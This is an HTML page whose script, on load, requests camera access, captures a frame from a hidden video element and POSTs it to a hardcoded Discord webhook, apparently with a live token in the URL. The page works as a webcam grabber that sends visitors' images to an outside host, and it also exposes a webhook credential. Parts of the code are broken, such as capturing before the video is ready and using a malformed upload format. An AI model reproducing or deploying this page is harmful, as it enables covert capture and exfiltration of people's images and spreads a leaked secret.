<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Image to Discord Webhook</title>
    <style>
        /* Styles for the page */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1a1a1d;
            color: #e0e0e0;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: background-color 0.5s;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffa726; /* Luxury Gold color for headings */
        }

        p {
            font-size: 16px;
            margin-bottom: 30px;
            text-align: center;
        }

        button {
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            background-color: #673ab7; /* Premium Purple color for buttons */
            color: #fff;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #512da8;
        }

        #colorChangeButton {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 999;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s;
        }

        #colorChangeButton:hover {
            transform: scale(1.1);
        }

        #videoElement {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Welcome to the Image Capture & Discord Webhook Page!</h1>
    <p>This page will capture your image from the camera and send it to the Discord webhook.</p>

    <video id="videoElement" autoplay></video>

    <script>
        // JavaScript code
        const video = document.getElementById('videoElement');

        // Check if the browser supports accessing the user's camera
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    video.srcObject = stream;
                    // Call the capturePicture function when the video stream is loaded
                    capturePicture();
                })
                .catch(function (error) {
                    console.error("Error accessing camera:", error);
                });
        }

        // Function to capture a picture from the video stream
        function capturePicture() {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgURL = canvas.toDataURL('image/png');

            // Send the captured image to the provided Discord webhook
            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Your Discord webhook URL

            fetch(webhookURL, {
                method: 'POST',
                body: JSON.stringify({ content: 'Image captured from user camera:', files: [imgURL] })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send image to Discord webhook');
                }
                console.log('Image sent to Discord webhook');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
